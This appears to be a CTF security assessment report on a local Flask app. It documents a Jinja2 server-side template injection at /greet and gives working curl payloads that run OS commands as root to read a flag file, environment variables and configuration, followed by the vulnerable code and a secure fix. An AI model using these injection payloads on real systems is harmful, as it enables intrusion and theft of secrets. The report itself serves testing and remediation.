# Security Assessment Report

## Executive Summary
- Target: http://localhost:33081
- Assessment Date: October 31, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application does not implement any authentication mechanisms—all endpoints are publicly accessible without requiring credentials. While this represents a design choice for this CTF challenge, it eliminates authentication-specific attack vectors.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application does not implement any authorization controls or role-based access restrictions. All endpoints are accessible to all users without privilege checks.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No traditional XSS vulnerabilities were found. The application does not contain client-side JavaScript or dynamic HTML attribute generation that could be exploited for XSS attacks. While the SSTI vulnerability can be leveraged to inject HTML/JavaScript content, this is a consequence of server-side code execution rather than a client-side injection flaw.

**SQL/Command Injection Vulnerabilities:**
One CRITICAL Server-Side Template Injection (SSTI) vulnerability was successfully exploited at the `/greet` endpoint. This vulnerability allows complete Remote Code Execution (RCE) with root privileges within the container, enabling:
- Arbitrary Python code execution through Jinja2 template injection
- CTF flag extraction from `/tmp/flag`
- System command execution (`id`, `whoami`, `uname`, `env`, file operations)
- Flask configuration disclosure
- Complete server compromise

The vulnerability exists due to unsafe use of `render_template_string()` with unsanitized user input directly interpolated into the template string. Attack complexity is LOW—exploitation requires only a single unauthenticated HTTP GET request.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not make any outbound HTTP requests, does not fetch remote resources, and does not implement webhook, callback, or URL redirection functionality. The application is purely a request-response handler with no network-initiated server-side requests.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- Port 80 (HTTP): Caddy httpd reverse proxy
- Port 443 (HTTPS): SSL/HTTPS via Caddy
- Port 631: CUPS 2.3 printing service (out of scope)
- Port 8888: SimpleHTTPServer (Python 3.12.10) - Git repository exposed at `.git/` directory
- Port 9999: tcpwrapped service (unknown)
- Port 49152: Tailscale service requiring authentication with strong security headers (CSP, X-Frame-Options: DENY, X-Content-Type-Options: nosniff)

**Security-Relevant Findings:**
- Target application accessible at http://localhost:33081 (reverse proxied through Caddy to container port 5000)
- Flask application runs on Werkzeug 3.0.3 development server (not production-ready)
- Container runtime: Podman
- Application executes as root (UID 0) within container environment
- No Web Application Firewall (WAF) detected
- No rate limiting implemented
- HTTP only (no HTTPS enforcement on application layer)
- Git repository exposed on port 8888 with last commit message visible

**Subdomain Discoveries:**
Multiple localhost subdomains discovered (development environment artifacts): mail.regency.localhost, autodiscover.localhost, www.localhost, and others. These appear to be scanning environment artifacts and are not related to the target application.

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Server-Side Template Injection (SSTI) at /greet endpoint

**Summary:**
- **Vulnerable location:** GET `/greet` endpoint, `name` query parameter
- **Overview:** Server-Side Template Injection in Flask/Jinja2 application allowing Remote Code Execution via unsafe template string construction
- **Impact:** Complete server compromise with root-level Remote Code Execution (RCE). Successfully extracted CTF flag, executed arbitrary system commands, and accessed sensitive configuration data
- **Severity:** Critical (CVSS 9.8+)

**Prerequisites:**
- Target application accessible at: http://localhost:33081
- No authentication required (endpoint is publicly accessible)
- No special tools required (exploitation via standard HTTP GET request with curl)

**Exploitation Steps:**

**Step 1: Confirm SSTI Vulnerability**

Execute basic template expression to verify Jinja2 template injection:

```bash
curl "http://localhost:33081/greet?name=%7B%7B7*7%7D%7D"
```

**Response:**
```
Hello, 49!
```

**Analysis:** The payload `{{7*7}}` was successfully evaluated by the Jinja2 template engine, returning `49` instead of the literal string. This confirms the application is vulnerable to Server-Side Template Injection.

---

**Step 2: Extract CTF Flag (Primary Objective)**

Execute Remote Code Execution payload to read the flag file:

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20/tmp/flag').read()%7D%7D"
```

**Response:**
```
Hello, FLAG{c01aac1a1acd14273815f261db35d3723ce38bc30730f673b31707f8c99f4064}
!
```

**Analysis:** Using Python object introspection through the Jinja2 template context, we accessed the `request.application` object, navigated to `__globals__` to access the global namespace, then `__builtins__` to access built-in functions, imported the `os` module, and executed `os.popen('cat /tmp/flag')` to read the flag file. The flag value was successfully exfiltrated in the HTTP response.

**Flag Captured:** `FLAG{c01aac1a1acd14273815f261db35d3723ce38bc30730f673b31707f8c99f4064}`

---

**Step 3: Demonstrate Root-Level Remote Code Execution**

Execute system commands to prove complete server compromise:

**3a. Execute `id` command to show user context:**

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D"
```

**Response:**
```
Hello, uid=0(root) gid=0(root) groups=0(root)
!
```

**Analysis:** The application is running as root (UID 0), providing maximum privileges within the container environment.

---

**3b. Execute `whoami` command:**

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('whoami').read()%7D%7D"
```

**Response:**
```
Hello, root
!
```

---

**3c. Execute `uname -a` to show system information:**

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('uname%20-a').read()%7D%7D"
```

**Response:**
```
Hello, Linux b901390cbb53 6.12.13-200.fc41.aarch64 #1 SMP PREEMPT_DYNAMIC Sat Feb  8 20:30:50 UTC 2025 aarch64 GNU/Linux
!
```

**Analysis:** Confirmed the application is running in a Linux container (hostname: b901390cbb53) on an ARM64 architecture with kernel version 6.12.13.

---

**Step 4: Extract Flask Configuration**

Access Flask application configuration object:

```bash
curl "http://localhost:33081/greet?name=%7B%7Bconfig%7D%7D"
```

**Response (truncated for readability):**
```
Hello, <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>!
```

**Key Findings:**
- `DEBUG`: False (good security practice)
- `SECRET_KEY`: None (no session encryption configured, but not relevant since no sessions are used)
- `SESSION_COOKIE_SECURE`: False (sessions would be transmitted over HTTP)
- `PREFERRED_URL_SCHEME`: 'http' (no HTTPS enforcement)

---

**Step 5: Extract Environment Variables**

Access container environment variables:

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('env').read()%7D%7D"
```

**Response:**
```
Hello, HOSTNAME=b901390cbb53
HOME=/root
NO_PROXY=local,169.254/16
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
PYTHON_SHA256=668391afabd5083faafa4543753d190f82f33ce6ba22d6e9ac728b43644b278a
WERKZEUG_SERVER_FD=3
container=podman
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.9.24
PWD=/app
!
```

**Key Findings:**
- Container runtime: Podman
- Python version: 3.9.24
- Working directory: /app
- Container hostname: b901390cbb53

---

**Step 6: Enumerate File System**

List contents of /tmp directory containing the flag:

```bash
curl "http://localhost:33081/greet?name=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls%20-la%20/tmp/').read()%7D%7D"
```

**Response:**
```
Hello, total 276
drwxrwxrwt. 1 root root      6 Oct 24 23:51 .
dr-xr-xr-x. 1 root root     50 Oct 31 17:48 ..
-rw-r--r--. 1 root root     71 Oct 24 23:50 flag
-rw-------. 1 root root 275233 Oct 21 02:22 tmpt1mrkn9tcacert.pem
!
```

**Analysis:** The flag file at `/tmp/flag` is world-readable (permissions: -rw-r--r--), allowing any user to read it. File size is 71 bytes.

---

**Proof of Impact:**

This vulnerability provides **complete server compromise** with the following demonstrated capabilities:

1. **Remote Code Execution (RCE):** Successfully executed arbitrary system commands (`id`, `whoami`, `uname`, `cat`, `ls`, `env`) with root privileges
2. **Data Exfiltration:** Extracted the CTF flag from `/tmp/flag` file
3. **Configuration Disclosure:** Accessed Flask application configuration object containing security settings
4. **Environment Disclosure:** Extracted all environment variables from the container
5. **File System Access:** Listed directory contents and confirmed file permissions
6. **Privilege Level:** Confirmed execution as root (UID 0) within the container

**Impact Classification:**
- **Confidentiality:** CRITICAL - Complete access to all data in the container, including sensitive flag file
- **Integrity:** CRITICAL - Ability to modify files, install backdoors, and alter application behavior
- **Availability:** CRITICAL - Ability to crash the application, exhaust resources, or shut down the container

**Attack Complexity:** LOW - Single HTTP GET request, no authentication required, publicly documented SSTI exploitation techniques

---

**Notes:**

**Vulnerability Root Cause:**
The vulnerability exists in `/greet` route handler at `app/app.py:26-30`:

```python
@app.route('/greet')
def greet():
    name = request.args.get('name', '')      # Line 28: Untrusted input
    template = f"Hello, {name}!"             # Line 29: Direct interpolation into template string
    return render_template_string(template)  # Line 30: Template rendering with user-controlled content
```

The code incorrectly uses Python f-string interpolation to construct a template string from user input, then passes this user-controlled template content to `render_template_string()`. This allows attackers to inject Jinja2 template expressions that are evaluated by the template engine.

**Secure Alternative:**
The correct implementation would pass user input as a template **variable**, not as template **content**:

```python
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    template = "Hello, {{ name }}!"  # Static template content
    return render_template_string(template, name=name)  # User input as variable
```

**No Security Controls Detected:**
- No Web Application Firewall (WAF)
- No input validation or sanitization
- No rate limiting
- No authentication required
- No output encoding (bypassed by SSTI anyway)
- No Content Security Policy (CSP) headers

**Exploitation Method:**
Python object introspection through Jinja2 template context:
```
request.application → Flask app object
.__globals__ → Access global namespace
.__builtins__ → Access built-in functions
.__import__('os') → Import os module
.popen('command') → Execute shell command
.read() → Read command output
```

This exploitation chain leverages Python's introspection capabilities to break out of the Jinja2 template sandbox and achieve arbitrary code execution.
